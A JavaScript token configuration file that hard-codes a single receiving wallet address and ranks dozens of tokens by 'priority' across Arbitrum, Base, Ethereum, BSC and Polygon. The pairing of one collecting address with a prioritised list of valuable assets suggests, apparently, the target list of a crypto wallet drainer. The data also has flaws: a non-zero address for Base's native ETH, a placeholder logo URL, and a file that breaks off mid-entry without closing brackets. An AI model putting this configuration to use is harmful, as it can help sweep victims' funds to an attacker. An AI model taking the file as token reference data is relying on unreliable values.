// config/tokens.js
var RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

var TOKENS = {
  arbitrum: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x2f2a2543B76A4166549F7aaB2e75Bef0aefC5B0f",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 4
    },
    {
      name: "Arbitrum",
      symbol: "ARB",
      address: "0x912CE59144191C1204E64559FE8253a0e49E6548",
      logo: "https://assets.coingecko.com/coins/images/16547/standard/photo_2023-03-29_21.47.00.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "GMX",
      symbol: "GMX",
      address: "0xfc5A1A6EB076a2C7aD06eD22C90d7E710E35ad0a",
      logo: "https://assets.coingecko.com/coins/images/18323/standard/arbit.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "Radiant Capital",
      symbol: "RDNT",
      address: "0x3082CC23568eA640225c2467653dB90e9250AaA0",
      logo: "https://assets.coingecko.com/coins/images/26536/standard/RDNT_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 7
    },
    {
      name: "Stargate Finance",
      symbol: "STG",
      address: "0x6694340fc020c5E6B96567843da2df01b2CE1eb6",
      logo: "https://assets.coingecko.com/coins/images/24413/standard/stg_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8
    },
    {
      name: "Magic Internet Money",
      symbol: "MIM",
      address: "0xFEa7a6a0B346362BF88A9e4A88416B77a57D6c2A",
      logo: "https://assets.coingecko.com/coins/images/16786/standard/mimlogopng.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 9
    },
    {
      name: "PlutusDAO",
      symbol: "PLS",
      address: "0x51318B7D00db7ACc4026C88c3952B66278B6A67F",
      logo: "https://assets.coingecko.com/coins/images/24738/standard/pls.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10
    },
    {
      name: "Jones DAO",
      symbol: "JONES",
      address: "0x10393c20975cF177a3513071bC110f7962CD67da",
      logo: "https://assets.coingecko.com/coins/images/25457/standard/jones_icon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Dopex",
      symbol: "DPX",
      address: "0x6C2C06790b3E3E3c38e12Ee22F8183b37a13EE55",
      logo: "https://assets.coingecko.com/coins/images/16688/standard/DPX_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12
    },
    {
      name: "Wombat Exchange",
      symbol: "WOM",
      address: "0x7b5eb3940021ec0e8e463d5dbb4b7b09a89ddf96",
      logo: "https://assets.coingecko.com/coins/images/26442/standard/wom_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Vertex Protocol",
      symbol: "VRTX",
      address: "0x95146881b86b3ee99e63705ec87afe29fcc044d9",
      logo: "https://assets.coingecko.com/coins/images/28267/standard/vertex.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 14
    },
    {
      name: "Cap Finance",
      symbol: "CAP",
      address: "0x031d35296154279dc1984dcd93e392b1f946737b",
      logo: "https://assets.coingecko.com/coins/images/22817/standard/cap.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "Umami Finance",
      symbol: "UMAMI",
      address: "0x1622bF67e6e5747b81866fE0b85178a93C7F86e3",
      logo: "https://assets.coingecko.com/coins/images/26054/standard/umami.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 16
    }
  ],
  
  base: [
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x742d35Cc6634C0532925a3b844Bc454e4438f44e",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 1
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "Wrapped Ether",
      symbol: "WETH",
      address: "0x4200000000000000000000000000000000000006",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "BALD",
      symbol: "BALD",
      address: "0x27D2DECb4bFC9C76F0309b8E88dec3a601Fe25a8",
      logo: "https://assets.coingecko.com/coins/images/30683/standard/bald.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x7c6b91D9Be155A6Db01f749217d76fF02A7227F2",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 5
    },
    {
      name: "Base Doge",
      symbol: "BDOGE",
      address: "0x4C2A4fD3686701AFb38d8722256eF52F519c179e",
      logo: "https://assets.coingecko.com/coins/images/35725/standard/bdoge.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "Toshi",
      symbol: "TOSHI",
      address: "0xF4d861575ecC9493420A3f5a14F85B13f0b50EB3",
      logo: "https://assets.coingecko.com/coins/images/36338/standard/toshi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 7
    },
    {
      name: "Friend.tech Shares",
      symbol: "FRIEND",
      address: "0xCF205808Ed36593aa40a44F10c7f7C2F67d4A4d4",
      logo: "https://assets.coingecko.com/coins/images/36757/standard/friend.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 8
    },
    {
      name: "Based Brett",
      symbol: "BRETT",
      address: "0x532f27101965dd16442E59d40670FaF5eBB142E4",
      logo: "https://assets.coingecko.com/coins/images/36339/standard/Brett.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 9
    },
    {
      name: "Degen",
      symbol: "DEGEN",
      address: "0x4ed4E862860beD51a9570b96d89aF5E1B0Efefed",
      logo: "https://assets.coingecko.com/coins/images/36340/standard/degen.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 10
    },
    {
      name: "Mochi",
      symbol: "MOCHI",
      address: "0xc6e5E6d9C5A3945eDfcf557623C53D2796d3142e",
      logo: "https://assets.coingecko.com/coins/images/36341/standard/mochi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Tyler Hobbs Fidenza",
      symbol: "FIDENZA",
      address: "0x3B350F202473932411772C8Cb76DB7975f42397E",
      logo: "https://assets.coingecko.com/coins/images/36342/standard/fidenza.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 12
    },
    {
      name: "Extra Finance",
      symbol: "EXTRA",
      address: "0x2dA3DcF6C44E4D207A9f5e47a5df2aA4DcC308FB",
      logo: "https://assets.coingecko.com/coins/images/35283/standard/extra-icon-200px.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Parallel Token",
      symbol: "PRIME",
      address: "0xFA980cEd6895AC314E7dE34Ef1bFAE90a5AdD21b",
      logo: "https://assets.coingecko.com/coins/images/28953/standard/prime.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 14
    },
    {
      name: "Seamless Protocol",
      symbol: "SEAM",
      address: "0x1C7a460413dD4e964f96D8dFC56E7223cE88CD85",
      logo: "https://assets.coingecko.com/coins/images/34344/standard/seamless.PNG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "Aerodrome Finance",
      symbol: "AERO",
      address: "0x940181a94A35A4569E4529A3CDfB74e38FD98631",
      logo: "https://assets.coingecko.com/coins/images/35783/standard/aerodrome.PNG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 16
    }
  ],

  ethereum: [
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 62
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 63
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x6B175474E89094C44Da98b954EedeAC495271d0F",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 64
    },
    {
      name: "Wrapped Ethereum",
      symbol: "WETH",
      address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",
      logo: "https://assets.coingecko.com/coins/images/2518/standard/weth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 65
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 997
    },
    {
      name: "Lido Staked Ether",
      symbol: "stETH",
      address: "0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84",
      logo: "https://assets.coingecko.com/coins/images/13442/standard/steth_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 66
    },
    {
      name: "Maker",
      symbol: "MKR",
      address: "0x9f8F72aA9304c8B593d555F12eF6589cC3A579A2",
      logo: "https://assets.coingecko.com/coins/images/1364/standard/Mark_Maker.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 67
    },
    {
      name: "ApeCoin",
      symbol: "APE",
      address: "0x4d224452801ACEd8B2F0aebE155379bb5D594381",
      logo: "https://assets.coingecko.com/coins/images/24383/standard/apecoin.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 68
    },
    {
      name: "Frax",
      symbol: "FRAX",
      address: "0x853d955aCEf822Db058eb8505911ED77F175b99e",
      logo: "https://assets.coingecko.com/coins/images/13422/standard/frax_logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 69
    },
    {
      name: "Frax Share",
      symbol: "FXS",
      address: "0x3432B6A60D23Ca0dFCa7761B7ab56459D9C964D0",
      logo: "https://assets.coingecko.com/coins/images/13423/standard/frax_share.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 70
    },
    {
      name: "Rocket Pool ETH",
      symbol: "rETH",
      address: "0xae78736Cd615f374D3085123A210448E74Fc6393",
      logo: "https://assets.coingecko.com/coins/images/20764/standard/reth.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 71
    },
    {
      name: "Liquity USD",
      symbol: "LUSD",
      address: "0x5f98805A4E8be255a32880FDeC7F6728C6568bA0",
      logo: "https://assets.coingecko.com/coins/images/14666/standard/Group_3.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 72
    },
    {
      name: "Aurora",
      symbol: "AURORA",
      address: "0xaaaaaa20d9e0e2461697782ef11675f668207961",
      logo: "https://assets.coingecko.com/coins/images/18408/standard/aurora.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 73
    },
    {
      name: "Celer Network",
      symbol: "CELR",
      address: "0x4f9254c83eb525f9fcf346490bbb3ed28a81c667",
      logo: "https://assets.coingecko.com/coins/images/4379/standard/Celr.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 74
    },
    {
      name: "Convex Finance",
      symbol: "CVX",
      address: "0x4e3fbd56cd56c3e72c1403e103b45db9da5b9d2b",
      logo: "https://assets.coingecko.com/coins/images/15585/standard/convex.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 75
    },
    {
      name: "DEXTools",
      symbol: "DEXT",
      address: "0xfb7b4564402e5500db5bb6d63ae671302777c75a",
      logo: "https://assets.coingecko.com/coins/images/11603/standard/dext.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 76
    },
    {
      name: "Gala",
      symbol: "GALA",
      address: "0x15D4c048F83bd7e37d49eA4C83a07267Ec4203dA",
      logo: "https://assets.coingecko.com/coins/images/12493/standard/GALA-COINGECKO.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 77
    },
    {
      name: "Illuvium",
      symbol: "ILV",
      address: "0x767FE9EDC9E0dF98E07454847909b5E959D7ca0E",
      logo: "https://assets.coingecko.com/coins/images/14468/standard/ILV.JPG",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 78
    },
    {
      name: "JasmyCoin",
      symbol: "JASMY",
      address: "0x7420B4b9a0110cdC71fB720908340C03F9Bc03EC",
      logo: "https://assets.coingecko.com/coins/images/13876/standard/JasmyCoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 79
    },
    {
      name: "Keep Network",
      symbol: "KEEP",
      address: "0x85Eee30c52B0b379b046Fb0F85F4f3Dc3009aFEC",
      logo: "https://assets.coingecko.com/coins/images/3373/standard/IuNzUb5b_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 80
    }
  ],

  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 2
    },
    {
      name: "APX",
      symbol: "APX",
      address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
      logo: "https://assets.coingecko.com/coins/images/21972/standard/apx.png?1696521320",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "AIOZ Network",
      symbol: "AIOZ",
      address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/9104.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Koma Inu",
      symbol: "KOMA",
      address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
      logo: "https://assets.coingecko.com/coins/images/50902/standard/IMG_7580.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "CZ'S Dog",
      symbol: "BROCCOLI",
      address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
      logo: "https://assets.coingecko.com/coins/images/54400/standard/broccoli.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 6
    },
    {
      name: "HELLO Labs",
      symbol: "HELLO",
      address: "0x0F1cBEd8EFa0E012AdbCCB1638D0aB0147D5Ac00",
      logo: "https://s2.coinmarketcap.com/static/img/coins/64x64/22320.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 61
    },
    {
      name: "WBNB",
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      logo: "https://assets.coingecko.com/coins/images/12591/standard/binance-coin-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 995
    },
    {
      name: "Binance USD",
      symbol: "BUSD",
      address: "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56",
      logo: "https://assets.coingecko.com/coins/images/31273/standard/new_binance-peg-busd.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 3
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 5
    },
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0xc748673057861a797275CD8A068AbB95A902e8de",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x2859e4544C4bB03966803b044A93563Bd2D0DD4D",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0xfb5B838b6cfEEdC2873aB27866079AC55363D37E",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
      address: "0x7bd6FaBD64813c48545C9c0e312A0099d9be2540",
      logo: "https://assets.coingecko.com/coins/images/14962/standard/6GxcPRo3_400x400.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 13
    },
    {
      name: "Pepe",
      symbol: "PEPE",
      address: "0x25d887Ce7a35172C62FeBFD67a1856F20FaEbB00",
      logo: "https://assets.coingecko.com/coins/images/29850/standard/pepe-token.jpeg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 15
    },
    {
      name: "PancakeSwap",
      symbol: "CAKE",
      address: "0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82",
      logo: "https://assets.coingecko.com/coins/images/12632/standard/pancakeswap-cake-logo_%281%29.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "ApeSwap",
      symbol: "BANANA",
      address: "0x603c7f932ED1fc6575303D8Fb018fDCBb0f39a95",
      logo: "https://assets.coingecko.com/coins/images/14870/standard/banana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Venus",
      symbol: "XVS",
      address: "0xcF6BB5389c92Bdda8a3747Ddb454cB7a64626C63",
      logo: "https://assets.coingecko.com/coins/images/12677/standard/venus.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Alpaca Finance",
      symbol: "ALPACA",
      address: "0x8F0528cE5eF7B51152A59745bEfDD91D97091d2F",
      logo: "https://assets.coingecko.com/coins/images/14165/standard/Logo200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 23
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x2170Ed0880ac9A755fd29B2688956BD959F933F8",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Bitcoin BEP2",
      symbol: "BTCB",
      address: "0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c",
      logo: "https://assets.coingecko.com/coins/images/14108/standard/Binance-bitcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0xF8A0BF9cF54Bb92F17374d9e9A321E6a111a51bD",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Polygon",
      symbol: "MATIC",
      address: "0xCC42724C6683B7E57334c4E856f4c9965ED682bD",
      logo: "https://assets.coingecko.com/coins/images/4713/standard/polygon.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Cardano",
      symbol: "ADA",
      address: "0x3EE2200Efb3400fAbB9AacF31297cBdD1d435D47",
      logo: "https://assets.coingecko.com/coins/images/975/standard/cardano.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 34
    },
    {
      name: "Binance Wrapped DOT",
      symbol: "BDOT",
      address: "0x78867BbEeF44f2326bF8DDd1941a4439382EF2A7",
      logo: "https://example.com/bdot.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "Ankr",
      symbol: "ANKR",
      address: "0xf307910A4c7bbc79691fD374889b36d8531B08e3",
      logo: "https://assets.coingecko.com/coins/images/4324/standard/U85xTl2.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Chromia",
      symbol: "CHR",
      address: "0xf9CeC8d50f6c8ad3Fb6dcCEC577e05aA32B224FE",
      logo: "https://assets.coingecko.com/coins/images/5000/standard/Chromia.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 42
    },
    {
      name: "Alchemy Pay",
      symbol: "ACH",
      address: "0xbc7d6b50616989655afd682fb42743507003056d",
      logo: "https://assets.coingecko.com/coins/images/12390/standard/ACH_%281%29.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 43
    },
    {
      name: "Bella Protocol",
      symbol: "BEL",
      address: "0x8443f091997f06a61670b735ed92734f5628692f",
      logo: "https://assets.coingecko.com/coins/images/12478/standard/Bella.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 44
    },
    {
      name: "Biconomy",
      symbol: "BICO",
      address: "0x06250a4962558f0f3e69fc07f4c67bb9c9eac739",
      logo: "https://assets.coingecko.com/coins/images/21061/standard/biconomy_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 45
    },
    {
      name: "Cartesi",
      symbol: "CTSI",
      address: "0x8da443f84fea710266c8eb6bc34b71702d033ef2",
      logo: "https://assets.coingecko.com/coins/images/11038/standard/cartesi.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 46
    },
    {
      name: "Green Metaverse Token",
      symbol: "GMT",
      address: "0x3019BF2a2eF8040C242C9a4c5c4BD4C81678b2A1",
      logo: "https://assets.coingecko.com/coins/images/14270/standard/step.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 24
    },
    {
      name: "Trust Wallet Token",
      symbol: "TWT",
      address: "0x4B0F1812e5Df2A09796481Ff14017e6005508003",
      logo: "https://assets.coingecko.com/coins/images/11085/standard/Trust.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 25
    },
    {
      name: "SafeMoon",
      symbol: "SFM",
      address: "0x42981d0bfbAf196529376EE702F2a9Eb9092fcB5",
      logo: "https://assets.coingecko.com/coins/images/21863/standard/photo_2021-12-22_14.43.36.jpeg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 26
    },
    {
      name: "WINkLink",
      symbol: "WIN",
      address: "0xaeF0d72a118ce24feE3cD1d43d383897D05B4e99",
      logo: "https://assets.coingecko.com/coins/images/9129/standard/WINkcoin.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 28
    },
    {
      name: "Ankr Staked BNB",
      symbol: "ankrBNB",
      address: "0x52F24a5e03aee338Da5fd9Df68D2b6FAe1178827",
      logo: "https://assets.coingecko.com/coins/images/29696/standard/ankrBNB.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 29
    },
    {
      name: "Mobox",
      symbol: "MBOX",
      address: "0x3203c9e46cA618C8C1cE5dC67e7e9D75f5da2377",
      logo: "https://assets.coingecko.com/coins/images/14751/standard/mobox.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      logo: "https://assets.coingecko.com/coins/images/825/standard/bnb-icon2_2x.png",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],

  polygon: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      logo: "https://assets.coingecko.com/coins/images/13751/standard/autofarm_icon_200x200.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 1
    },
    {
      name: "Tether USD",
      symbol: "USDT",
      address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
      logo: "https://assets.coingecko.com/coins/images/325/standard/Tether.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 2
    },
    {
      name: "USD Coin",
      symbol: "USDC",
      address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
      logo: "https://assets.coingecko.com/coins/images/6319/standard/usdc.png",
      abi: ERC20_ABI,
      decimals: 6,
      priority: 3
    },
    {
      name: "Dai Stablecoin",
      symbol: "DAI",
      address: "0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063",
      logo: "https://assets.coingecko.com/coins/images/9956/standard/Badge_Dai.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 4
    },
    {
      name: "BabyDoge Coin",
      symbol: "BabyDoge",
      address: "0x4E158Ef7F1E3DA85E2c1D2a9e2270F4C2E0D3294",
      logo: "https://assets.coingecko.com/coins/images/16125/standard/babydoge.jpg",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 10
    },
    {
      name: "Shiba Inu",
      symbol: "SHIB",
      address: "0x6f8a06447Ff6FcF75d803135a7de15CE88C1d4ec",
      logo: "https://assets.coingecko.com/coins/images/11939/standard/shiba.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 11
    },
    {
      name: "Floki Inu",
      symbol: "FLOKI",
      address: "0x3A9A81d576d83FF21f26f325066054540720fC34",
      logo: "https://assets.coingecko.com/coins/images/16746/standard/PNG_image.png",
      abi: ERC20_ABI,
      decimals: 9,
      priority: 12
    },
    {
      name: "QuickSwap",
      symbol: "QUICK",
      address: "0x831753DD7087CaC61aB5644b308642cc1c33Dc13",
      logo: "https://assets.coingecko.com/coins/images/13970/standard/QuickSwap.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 20
    },
    {
      name: "Aave",
      symbol: "AAVE",
      address: "0xD6DF932A45C0f255f85145f286eA0b292B21C90B",
      logo: "https://assets.coingecko.com/coins/images/12645/standard/AAVE.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 21
    },
    {
      name: "Curve DAO",
      symbol: "CRV",
      address: "0x172370d5Cd63279eFa6d502DAB29171933a610AF",
      logo: "https://assets.coingecko.com/coins/images/12124/standard/Curve.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 22
    },
    {
      name: "Ethereum",
      symbol: "ETH",
      address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619",
      logo: "https://assets.coingecko.com/coins/images/279/standard/ethereum.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 30
    },
    {
      name: "Wrapped Bitcoin",
      symbol: "WBTC",
      address: "0x1BFD67037B42Cf73acF2047067bd4F2C47D9BfD6",
      logo: "https://assets.coingecko.com/coins/images/7598/standard/wrapped_bitcoin_wbtc.png",
      abi: ERC20_ABI,
      decimals: 8,
      priority: 31
    },
    {
      name: "Chainlink",
      symbol: "LINK",
      address: "0x53E0bca35eC356BD5ddDFebbD1Fc0fD03FaBad39",
      logo: "https://assets.coingecko.com/coins/images/877/standard/chainlink-new-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 32
    },
    {
      name: "Uniswap",
      symbol: "UNI",
      address: "0xb33EaAd8d922B1083446DC23f610c2567fB5180f",
      logo: "https://assets.coingecko.com/coins/images/12504/standard/uniswap-uni.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 33
    },
    {
      name: "Decentraland",
      symbol: "MANA",
      address: "0xA1c57f48F0Deb89f569dFbE6E2B7f46D33606fD4",
      logo: "https://assets.coingecko.com/coins/images/878/standard/decentraland-mana.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 40
    },
    {
      name: "The Sandbox",
      symbol: "SAND",
      address: "0xBbba073C31bF03b8ACf7c28EF0738DeCF3695683",
      logo: "https://assets.coingecko.com/coins/images/12129/standard/sandbox_logo.jpg",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 41
    },
    {
      name: "Axie Infinity",
      symbol: "AXS",
      address: "0x61BDD9C7d4dF4Bf47A4508c0c8245505F2Af5b7b",
      logo: "https://assets.coingecko.com/coins/images/13029/standard/axie-infinity-small-logo.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 42
    },
    {
      name: "DinoSwap",
      symbol: "DINO",
      address: "0xAa9654BECca45B5BDFA5ac646c939C62b527D394",
      logo: "https://assets.coingecko.com/coins/images/17103/standard/dino.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 43
    },
    {
      name: "Dfyn Network",
      symbol: "DFYN",
      address: "0xC168E40227E4ebD8C1caE80F7a55a4F0e6D66C97",
      logo: "https://assets.coingecko.com/coins/images/15126/standard/dfyn.png",
      abi: ERC20_ABI,
      decimals: 18,
      priority: 44
    },
    {
      name: "Dogelon Mars",
      symbol: "ELON",
